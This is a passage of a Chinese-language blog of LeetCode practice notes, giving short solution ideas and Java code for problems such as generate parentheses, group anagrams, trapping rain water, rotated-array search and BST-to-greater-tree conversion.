<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;String&gt; <span class="title function_">generateParenthesis</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line">        List&lt;String&gt; res = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        dfs(n, <span class="number">0</span>, <span class="number">0</span>, res, <span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">dfs</span><span class="params">(<span class="type">int</span> n, <span class="type">int</span> left, <span class="type">int</span> right, List&lt;String&gt; res, String cur)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (right &gt; left || left &gt; n) <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">if</span> (left == n &amp;&amp; right == n) &#123;</span><br><span class="line">            res.add(cur);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        dfs(n, left + <span class="number">1</span>, right, res, cur + <span class="string">&quot;(&quot;</span>);</span><br><span class="line">        dfs(n, left, right + <span class="number">1</span>, res, cur + <span class="string">&quot;)&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="49-字母异位词分组"><a href="#49-字母异位词分组" class="headerlink" title="49. 字母异位词分组"></a><a href="https://leetcode.cn/problems/group-anagrams/">49. 字母异位词分组</a></h3><p>思路：字母排序 + 哈希表</p>
<p>代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;String&gt;&gt; <span class="title function_">groupAnagrams</span><span class="params">(String[] strs)</span> &#123;</span><br><span class="line">        Map&lt;String, List&lt;String&gt;&gt; record = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (String str : strs) &#123;</span><br><span class="line">            <span class="type">char</span>[] array = str.toCharArray();</span><br><span class="line">            Arrays.sort(array);</span><br><span class="line">            record.computeIfAbsent(<span class="keyword">new</span> <span class="title class_">String</span>(array), k -&gt; <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;()).add(str);</span><br><span class="line">        &#125;</span><br><span class="line">        List&lt;List&lt;String&gt;&gt; res = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;(record.values());</span><br><span class="line">        <span class="keyword">return</span> res;        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="48-旋转图像"><a href="#48-旋转图像" class="headerlink" title="48. 旋转图像"></a><a href="https://leetcode.cn/problems/rotate-image/">48. 旋转图像</a></h3><p>思路：数学解释：<a href="https://leetcode.cn/problems/rotate-image/solutions/1692273/lu-qing-ge-chong-by-pennx-ce3x/?envType=problem-list-v2&envId=2cktkvj">数学解释</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">我们有四种基本变换：</span><br><span class="line">上下对称：matrix[i][j] -&gt; matrix[n-i-1][j]，（列不变）</span><br><span class="line">左右对称：matrix[i][j] -&gt; matrix[i][n-j-1]，（行不变）</span><br><span class="line">主对角线对称：matrix[i][j] -&gt; matrix[j][i]，（行列互换）</span><br><span class="line">副对角线对称：matrix[i][j] -&gt; matrix[n-j-1][n-i-1] （行列均变，且互换）</span><br><span class="line"></span><br><span class="line">顺时针旋转 arr[i][j] -&gt; arr[j][n - i -1] 可以等价为 主对角线对称 + 左右对称</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">46.</span> 全排列<span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">rotate</span><span class="params">(<span class="type">int</span>[][] matrix)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span> matrix.length;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;i &lt; m; i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> i + <span class="number">1</span>; j &lt; m; j++)&#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> matrix[i][j];</span><br><span class="line">                matrix[i][j] = matrix[j][i];</span><br><span class="line">                matrix[j][i] = temp;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;i &lt; m; i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j * <span class="number">2</span> &lt; m; j++)&#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> matrix[i][j];</span><br><span class="line">                matrix[i][j] = matrix[i][m - j - <span class="number">1</span>];</span><br><span class="line">                matrix[i][m - j - <span class="number">1</span>] = temp;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="46-全排列"><a href="#46-全排列" class="headerlink" title="46. 全排列"></a><a href="https://leetcode.cn/problems/permutations/">46. 全排列</a></h3><p>思路:数字长度很短，直接使用一个选择数组，然后遍历即可。搜索 + 回溯</p>
<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; <span class="title function_">permute</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> nums.length;</span><br><span class="line">        Set&lt;Integer&gt; chooseSet = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">        ArrayList&lt;Integer&gt; cur = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        List&lt;List&lt;Integer&gt;&gt; res = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        dfs(nums, chooseSet, <span class="number">0</span>, n, cur, res);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">dfs</span><span class="params">(<span class="type">int</span>[] nums, Set&lt;Integer&gt; chooseSet, <span class="type">int</span> i, <span class="type">int</span> n, ArrayList&lt;Integer&gt; cur, List&lt;List&lt;Integer&gt;&gt; res)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (i == n)&#123;</span><br><span class="line">            res.add(<span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;(cur));</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(chooseSet.contains(j)) <span class="keyword">continue</span>;</span><br><span class="line">            cur.add(nums[j]);</span><br><span class="line">            chooseSet.add(j);</span><br><span class="line">            dfs(nums, chooseSet, i + <span class="number">1</span>, n, cur, res);</span><br><span class="line">            cur.remove(Integer.valueOf(nums[j]));</span><br><span class="line">            chooseSet.remove(j);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="42-接雨水"><a href="#42-接雨水" class="headerlink" title="42. 接雨水"></a><a href="https://leetcode.cn/problems/trapping-rain-water/">42. 接雨水</a></h3><p>思路：经典题目。两个做法，dp记录左右两边最大值或单调栈。两种方法都坐下</p>
<p>代码一（dp做法）：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">trap</span><span class="params">(<span class="type">int</span>[] height)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> height.length;</span><br><span class="line">        <span class="type">int</span>[] rightMax = <span class="keyword">new</span> <span class="title class_">int</span>[n];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> n - <span class="number">2</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">            rightMax[i] = Integer.max(rightMax[i + <span class="number">1</span>], height[i + <span class="number">1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">leftMax</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">curHeight</span> <span class="operator">=</span> Integer.min(leftMax, rightMax[i]);</span><br><span class="line">            curHeight = Integer.max(<span class="number">0</span>, curHeight - height[i]);</span><br><span class="line">            res += curHeight;</span><br><span class="line">            leftMax = Integer.max(leftMax, height[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>代码二（单调栈做法）：</p>
<p>思路：单调栈横着算面积。我们栈是单调递减的栈。如果当前值大于栈顶值，那么如果栈有两个元素，那里两边都比他大。这个时候如果竖直算面积的话，无法确定竖直面积，因为右边最大值无法确定（左边最大值一定是最左边的值，改成队列就可以获得）。所以我们只能横着算面积，在我们处理的过程中每个横着的面积都处理了</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">trap</span><span class="params">(<span class="type">int</span>[] height)</span> &#123;</span><br><span class="line">        Deque&lt;Integer&gt; deque = <span class="keyword">new</span> <span class="title class_">ArrayDeque</span>&lt;&gt;();</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> height.length;</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">while</span> (!deque.isEmpty() &amp;&amp; height[i] &gt;= height[deque.getLast()])&#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> deque.pollLast();</span><br><span class="line">                <span class="keyword">if</span>(deque.isEmpty()) <span class="keyword">break</span>;</span><br><span class="line">                <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> deque.getLast();</span><br><span class="line">                res += (i - left -<span class="number">1</span>) * (Integer.min(height[i], height[left]) - height[mid]);</span><br><span class="line">            &#125;</span><br><span class="line">            deque.addLast(i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="39-组合总和"><a href="#39-组合总和" class="headerlink" title="39. 组合总和"></a><a href="https://leetcode.cn/problems/combination-sum/">39. 组合总和</a></h3><p>思路：感觉像完全背包，但是要输出组合总数。看数据范围发现target很小说明搜索减枝做法应该可行。</p>
<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; <span class="title function_">combinationSum</span><span class="params">(<span class="type">int</span>[] candidates, <span class="type">int</span> target)</span> &#123;</span><br><span class="line">        List&lt;List&lt;Integer&gt;&gt; res = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        List&lt;Integer&gt; cur = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        dfs(candidates, <span class="number">0</span>, <span class="number">0</span>, candidates.length, target, res, cur);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">dfs</span><span class="params">(<span class="type">int</span>[] candidates,<span class="type">int</span> curSum,<span class="type">int</span> curChooseIndex,<span class="type">int</span> n, <span class="type">int</span> target, List&lt;List&lt;Integer&gt;&gt; res, List&lt;Integer&gt; cur)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(curSum == target)&#123;</span><br><span class="line">            res.add(<span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;(cur));</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(curSum &gt; target || curChooseIndex == n) <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; candidates[curChooseIndex] * i &lt;= target; i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(i != <span class="number">0</span>) cur.add(candidates[curChooseIndex]);</span><br><span class="line">            dfs(candidates, curSum + candidates[curChooseIndex] * i, curChooseIndex + <span class="number">1</span>, n, target, res, cur);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//回溯</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; candidates[curChooseIndex] * i &lt;= target; i++)&#123;</span><br><span class="line">            cur.remove(Integer.valueOf(candidates[curChooseIndex]));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>todo:后续学习二三解法<a href="https://leetcode.cn/problems/combination-sum/solutions/2747858/liang-chong-fang-fa-xuan-huo-bu-xuan-mei-mhf9/?envType=problem-list-v2&envId=2cktkvj">39. 组合总和 - 力扣（LeetCode）</a></p>
<h3 id="543-二叉树的直径"><a href="#543-二叉树的直径" class="headerlink" title="543. 二叉树的直径"></a><a href="https://leetcode.cn/problems/diameter-of-binary-tree/">543. 二叉树的直径</a></h3><p>思路：后续遍历即可</p>
<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">ans</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">diameterOfBinaryTree</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        dfs(root);</span><br><span class="line">        <span class="keyword">return</span> ans - <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> <span class="title function_">dfs</span><span class="params">(TreeNode root)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">null</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> dfs(root.left);</span><br><span class="line">        <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> dfs(root.right);</span><br><span class="line">        ans = Integer.max(left + right + <span class="number">1</span>, ans);</span><br><span class="line">        <span class="keyword">return</span> Integer.max(left, right) + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="34-在排序数组中查找元素的第一个和最后一个位置"><a href="#34-在排序数组中查找元素的第一个和最后一个位置" class="headerlink" title="34. 在排序数组中查找元素的第一个和最后一个位置"></a><a href="https://leetcode.cn/problems/find-first-and-last-position-of-element-in-sorted-array/">34. 在排序数组中查找元素的第一个和最后一个位置</a></h3><p>思路：裸二分。定义find(x)返回大于等于x的第一个位置。那么我们可以find(x), find(x-1) （返回后可能需要判断下，是否是预期值）</p>
<p>代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] searchRange(<span class="type">int</span>[] nums, <span class="type">int</span> target) &#123;</span><br><span class="line">        <span class="keyword">if</span>(nums.length == <span class="number">0</span>) <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;-<span class="number">1</span>, -<span class="number">1</span>&#125;;</span><br><span class="line">        <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> binarySearch(nums, target);</span><br><span class="line">        <span class="type">int</span> <span class="variable">b</span> <span class="operator">=</span> binarySearch(nums, target + <span class="number">1</span>) - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span>(a == nums.length || nums[a] != target) <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;-<span class="number">1</span>, -<span class="number">1</span>&#125;;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;a, b&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//返回大于等于target的第一个位置</span></span><br><span class="line">    <span class="type">int</span> <span class="title function_">binarySearch</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> target)</span>&#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> nums.length - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (left &lt; right)&#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> left + (right - left) / <span class="number">2</span>;<span class="comment">//left &lt;= mid &lt; right</span></span><br><span class="line">            <span class="keyword">if</span>(nums[mid] &gt;= target) right = mid;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                left = mid + <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(nums[left] &lt; target) <span class="keyword">return</span> left + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">return</span> left;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="33-搜索旋转排序数组"><a href="#33-搜索旋转排序数组" class="headerlink" title="33. 搜索旋转排序数组"></a><a href="https://leetcode.cn/problems/search-in-rotated-sorted-array/">33. 搜索旋转排序数组</a></h3><p>思路：二分</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">left mid right</span><br><span class="line">arr[mid] &lt; right 说明mid已经是另一部分增序了。不然是第一部分曾序</span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">search</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> target)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> nums.length - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (left &lt; right)&#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> left + (right - left + <span class="number">1</span>) / <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span>(nums[mid] &lt; nums[left])&#123;</span><br><span class="line">                <span class="keyword">if</span>(nums[mid] &lt;= target &amp;&amp; target &lt;= nums[right])&#123;</span><br><span class="line">                    left = mid;</span><br><span class="line">                &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                    right = mid - <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span>(target &gt;= nums[left] &amp;&amp; target &lt; nums[mid])&#123;</span><br><span class="line">                    right = mid - <span class="number">1</span>;</span><br><span class="line">                &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                    left = mid;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (nums[left] != target) <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">return</span> left;  </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>细节部分</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(nums[mid] &lt; nums[left]) 这部分我们需要使用一定不同的值来进行比较</span><br><span class="line">因为其实跟left和right比都是一样的</span><br></pre></td></tr></table></figure>

<h3 id="32-最长有效括号"><a href="#32-最长有效括号" class="headerlink" title="32. 最长有效括号"></a><a href="https://leetcode.cn/problems/longest-valid-parentheses/">32. 最长有效括号</a></h3><p>思路：看范围，范围很大肯定不能搜索了。</p>
<p>括号的可以考虑下栈、动态规划。</p>
<p>动态规划做法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">longestValidParentheses</span><span class="params">(String s)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> s.length();</span><br><span class="line">        <span class="keyword">if</span> (n &lt; <span class="number">2</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span>[] dp = <span class="keyword">new</span> <span class="title class_">int</span>[n];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (s.charAt(i) == <span class="string">&#x27;)&#x27;</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (s.charAt(i - <span class="number">1</span>) == <span class="string">&#x27;(&#x27;</span>) &#123;</span><br><span class="line">                    dp[i] = (i - <span class="number">2</span> &gt;= <span class="number">0</span>) ? dp[i - <span class="number">2</span>] + <span class="number">2</span> : <span class="number">2</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (i - <span class="number">1</span> - dp[i - <span class="number">1</span>] &gt;= <span class="number">0</span> &amp;&amp; s.charAt(i - <span class="number">1</span> - dp[i - <span class="number">1</span>]) == <span class="string">&#x27;(&#x27;</span>) &#123;</span><br><span class="line"><span class="comment">//                    dp[i] = dp[i - 1] + (s.charAt(i - 1 - dp[i - 1]) == &#x27;(&#x27; + dp[i - 2 - dp[i - 1]])</span></span><br><span class="line">                    dp[i] = <span class="number">2</span> + dp[i - <span class="number">1</span>] + ((i - <span class="number">2</span> - dp[i - <span class="number">1</span>] &gt;= <span class="number">0</span>) ? dp[i - <span class="number">2</span> - dp[i - <span class="number">1</span>]] : <span class="number">0</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> Arrays.stream(dp).max().getAsInt();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>todo：之后完成二三做法</p>
<h3 id="60题了"><a href="#60题了" class="headerlink" title="60题了"></a>60题了</h3><h3 id="31-下一个排列"><a href="#31-下一个排列" class="headerlink" title="31. 下一个排列"></a><a href="https://leetcode.cn/problems/next-permutation/">31. 下一个排列</a></h3><p>思路：如果c++，可以直接用next_permucation(maybe)</p>
<p>倒着找，如果nums[i] &lt; nums[j] （nums[j] 是最小的大于nums[i]的数） 那么必然可以交换使得下个数更大.然后右边找更小的数（感觉可以冒泡方法式找最小）</p>
<p>1 2 3 4 -》 12 4 3 &#x3D;》1 3 2 4 -》 1 3 4 2 -》  1 4 2 3 -》 1 4 3 2</p>
<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">nextPermutation</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> nums.length;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> n - <span class="number">2</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[i] &lt; nums[i + <span class="number">1</span>])&#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">swapPlace</span> <span class="operator">=</span> i + <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">while</span> (swapPlace + <span class="number">1</span> &lt; n &amp;&amp; nums[i] &lt; nums[swapPlace + <span class="number">1</span>])&#123;</span><br><span class="line">                    swapPlace++;</span><br><span class="line">                &#125;</span><br><span class="line">                swap(nums, i, swapPlace);</span><br><span class="line">                <span class="comment">// 冒泡管 i + 1及其后面的数字使得最小 left = i + 1, right = n - 1,其实不用冒泡了因为，后面的必然是降序，遍历swap即可。感觉有点单调栈的感觉了</span></span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> n - <span class="number">1</span>; j &gt; i + <span class="number">1</span>; j--)&#123;</span><br><span class="line">                    <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">k</span> <span class="operator">=</span> i + <span class="number">1</span>; k &lt; j; k++)&#123;</span><br><span class="line">                        <span class="keyword">if</span>(nums[k] &gt; nums[k + <span class="number">1</span>])&#123;</span><br><span class="line">                            swap(nums, k, k + <span class="number">1</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; n - j - <span class="number">1</span>; j++) &#123;</span><br><span class="line">            swap(nums, j, n - j - <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">swap</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> i, <span class="type">int</span> j)</span>&#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> nums[j];</span><br><span class="line">        nums[j] = nums[i];</span><br><span class="line">        nums[i] = temp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="538-把二叉搜索树转换为累加树"><a href="#538-把二叉搜索树转换为累加树" class="headerlink" title="538. 把二叉搜索树转换为累加树"></a><a href="https://leetcode.cn/problems/convert-bst-to-greater-tree/">538. 把二叉搜索树转换为累加树</a></h3><p>思路：中序遍历（右中左），记录前面的和然后慢慢更新就行</p>
<p>代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * public class TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode left;</span></span><br><span class="line"><span class="comment"> *     TreeNode right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val) &#123; this.val = val; &#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val, TreeNode left, TreeNode right) &#123;</span></span><br><span class="line"><span class="comment"> *         this.val = val;</span></span><br><span class="line"><span class="comment"> *         this.left = left;</span></span><br><span class="line"><span class="comment"> *         this.right = right;</span></span><br><span class="line"><span class="comment"> *     &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">preSum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">convertBST</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        midTravel(root);</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">midTravel</span><span class="params">(TreeNode root)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">null</span>) <span class="keyword">return</span>;</span><br><span class="line">        midTravel(root.right);</span><br><span class="line">        preSum += root.val;</span><br><span class="line">        root.val = preSum;</span><br><span class="line">        midTravel(root.left);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

